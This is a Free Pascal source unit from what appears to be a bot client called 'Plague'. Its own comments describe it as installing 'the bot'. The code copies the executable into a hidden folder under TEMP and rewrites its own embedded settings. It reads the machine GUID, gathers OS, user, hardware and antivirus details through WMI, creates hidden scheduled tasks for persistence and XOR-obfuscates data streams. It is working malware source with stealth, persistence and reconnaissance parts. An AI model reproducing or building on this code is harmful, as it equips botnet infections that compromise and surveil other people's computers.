unit Tools;

{$mode objfpc}{$H+}

interface

uses
  Classes, Windows, Registry, SysUtils, ActiveX, ComObj,
  Variants, StrUtils, INIFiles;

function GetGUID: String;
procedure AnalyzeSystem;
procedure LoadSettings;
procedure UpdateResourceSettings(ExeName: String);
procedure DoFirstRun;
procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
procedure Initialize;
procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
procedure DeleteTask(ATaskName: String);
function Adler32(Str: String): LongWord;
procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);

var
  Nick, OS, ComputerName, UserName, CPU, GPU: String;
  AVName, AVState: String;
  Base, FileName, FullName, Server, ID: String;
  Discriminator: LongWord;
  Delay: LongInt;

  MSet:  TMemoryStream;
  Settings: TINIFile;

implementation

const
  MOD_ADLER = 65521;

var
  Reg: TRegistry;

procedure Initialize;
Begin
  ID:=GetGUID;
  Discriminator:=Adler32(ID);
  Nick:=Settings.ReadString('Install', 'Prefix', 'Client-')+LeftStr(ID, Pos('-', ID) - 1);
  Server:=Settings.ReadString('General', 'Server', 'http://localhost');
  Delay:=Settings.ReadInteger('General', 'Delay', 5000);
  FullName:=ParamStr(0);
  FileName:=ExtractFileName(FullName);
  Base:=SysUtils.GetEnvironmentVariable(Settings.ReadString('Install', 'BaseLocation', 'TEMP'));
  Base:=IncludeTrailingBackslash(Base) + Settings.ReadString('Install', 'BaseName', 'Plague');
end;

procedure DoFirstRun;
Begin
  //Install the bot
  //Establish a base
  if Not(DirectoryExists(Base)) then MkDir(Base);
  FileSetAttr(Base, faSysFile{%H-} or faHidden{%H-});
  CopyFile(PChar(ParamStr(0)), PChar(Base+'\'+FileName), False);
  //Add to StartUp
  //Modify the settings
  Settings.WriteInteger('General', 'FirstRun', 0);
  UpdateResourceSettings(Base+'\'+FileName);
  Restart(Base+'\'+FileName);
end;

function GetGUID: String;
Begin
  try
    Reg:=TRegistry.Create(KEY_READ OR KEY_WOW64_64KEY);
    Reg.RootKey:=HKEY_LOCAL_MACHINE;
    Reg.OpenKeyReadOnly('SOFTWARE\Microsoft\Cryptography');
    Result:=UpperCase(Reg.ReadString('MachineGuid'));
  finally
    Reg.Free;
  end;
end;

function GetAVState(Str: String): String;
var
  Index: Array [1..3] of Byte;
  A: String;
Begin
  Result:='';
  A:=IntToHex(StrToInt(Str), 6);
  Index[1]:=StrToInt(A[1]+A[2]);
  Index[2]:=StrToInt(A[3]+A[4]);
  Index[3]:=StrToInt(A[5]+A[6]);
  A:=IntToBin(Index[1], 8);
  if A[8]='1' then Result:='Firewall, ';
  if A[7]='1' then Result+='Auto-Update, ';
  if A[6]='1' then Result+='Antivirus, ';
  if A[5]='1' then Result+='Antispyware, ';
  if A[4]='1' then Result+='Internet-Settings, ';
  if A[3]='1' then Result+='UAC, ';
  if A[2]='1' then Result+='Custom Service, ';
  if Length(Result)=0 then Result:='No Protection'
  else Begin
    Delete(Result, Length(Result) - 1, 2);
  end;
  Result+=' - ';
  if Index[2]=10 then Result+='Active, '
  else Result+='Suspended, ';
  if Index[3]=0 then Result+='Up To Date'
  else Result+='Outdated';
end;

function GetWMIObject(const objectName: String): IDispatch;
var
  chEaten: PULONG;
  BindCtx: IBindCtx;
  Moniker: IMoniker;
begin
  OleCheck(CreateBindCtx(0, bindCtx));
  OleCheck(MkParseDisplayName(BindCtx, StringToOleStr(objectName), chEaten, Moniker));
  OleCheck(Moniker.BindToObject(BindCtx, nil, IDispatch, Result));
end;

function FormatSP(Str: String): String;
Begin
  if Length(Str)>2 then Result:=' ('+Str+')'
  else Result:='';
end;

procedure AnalyzeSystem;
var objWMIService : OLEVariant;
    colItems      : OLEVariant;
    colItem       : OLEVariant;
    oEnum         : IEnumvariant;
    iValue        : LongWord;
Begin
 CoInitialize(Nil);
 //Computer Information
 objWMIService := GetWMIObject('winmgmts:\\localhost\root\CIMV2');
 colItems      := objWMIService.ExecQuery('SELECT * FROM Win32_OperatingSystem','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   OS:=VarToStr(colItem.Caption)+' '+VarToStr(colItem.OSArchitecture)+
       FormatSP(VarToStr(colItem.CSDVersion));
   ComputerName:=VarToStr(colItem.CSName);
   UserName:=VarToStr(ColItem.RegisteredUser);
 end;
 //CPU Information
 colItems      := objWMIService.ExecQuery('SELECT * FROM Win32_Processor','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   CPU:=VarToStr(colItem.Name);
 end;
 //GPU Information
 colItems      := objWMIService.ExecQuery('SELECT * FROM Win32_VideoController','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   GPU:=VarToStr(colItem.Name);
 end;
 //Antivirus Information
 objWMIService := GetWMIObject('winmgmts:\\localhost\root\SecurityCenter2');
 colItems      := objWMIService.ExecQuery('SELECT * FROM AntiVirusProduct','WQL',0);
 oEnum         := IUnknown(colItems._NewEnum) as IEnumVariant;
 While oEnum.Next(1, colItem, iValue) = 0 do Begin
   AVName:=VarToStr(colItem.displayName);
   AVState:=GetAVState(VarToStr(colItem.productState));
 end;
 CoUninitialize;
end;

procedure LoadSettings;
var
  Res: TResourceStream;
Begin
  Res:=TResourceStream.Create(HInstance, 'Settings', RT_RCDATA);
  MSet:=TMemoryStream.Create;
  MSet.LoadFromStream(Res);
  Res.Free;
  Settings:=TINIFile.Create(MSet);
end;

procedure ReloadSettings;
Begin
  Settings.Free;
  MSet.Free;
  LoadSettings;
end;

procedure ScheduleTask(ATaskName, AFileName, AInterval: String);
begin
  ShellExecute(0, nil, 'schtasks', PChar('/create /tn "' + ATaskName + '" ' +
    '/tr "' + AFileName + '" /sc '+AInterval),
    nil, SW_HIDE);
end;

procedure DeleteTask(ATaskName: String);
Begin
  ShellExecute(0, nil, 'schtasks', PChar('/delete /f /tn "' + ATaskName + '"'),
    nil, SW_HIDE);
end;

procedure Restart(ExeName: String; RemoveOldCopy: Boolean = False);
var
  Params: String = '/wait';
Begin
  if RemoveOldCopy then Params += ' /removeold';
  ShellExecute(0, nil, PChar(ExeName), PChar(Params), nil, SW_SHOWNORMAL);
end;

procedure UpdateResourceSettings(ExeName: String);  //This will cause the bot to restart!
var
  Res: THandle;
Begin
  Res:=BeginUpdateResource(PChar(ExeName), False);
  UpdateResource(Res, RT_RCDATA, 'Settings', LANG_NEUTRAL, MSet.Memory, MSet.Size);
  EndUpdateResource(Res, False);
end;

function Adler32(Str: String): LongWord;
var
  I: LongInt;
  A, B: LongWord;
Begin
  A:=1;
  B:=0;
  For I:=1 to Length(Str) do Begin
    A:=(A + Ord(Str[I])) mod MOD_ADLER;
    B:=(B + A) mod MOD_ADLER;
  end;
  Result:=(B shl 16) or A;
End;

procedure ToggleCrypt(var MS: TMemoryStream; Key: Word);
var
   InMS: TMemoryStream;
   cnt: Integer;
   C: byte;
begin
  C:=0;
  InMS := TMemoryStream.Create;
  try
    InMS.CopyFrom(MS, MS.Size);
    InMS.Position := 0;
    MS.Clear;
    for cnt := 0 to InMS.Size - 1 do
      begin
        InMS.Read(C, 1) ;
        C := (C xor not (ord(Key shr cnt)));
        MS.Write(C, 1) ;
      end;
  finally
    InMS.Free;
  end;
  MS.Position:=0;
end;

end.

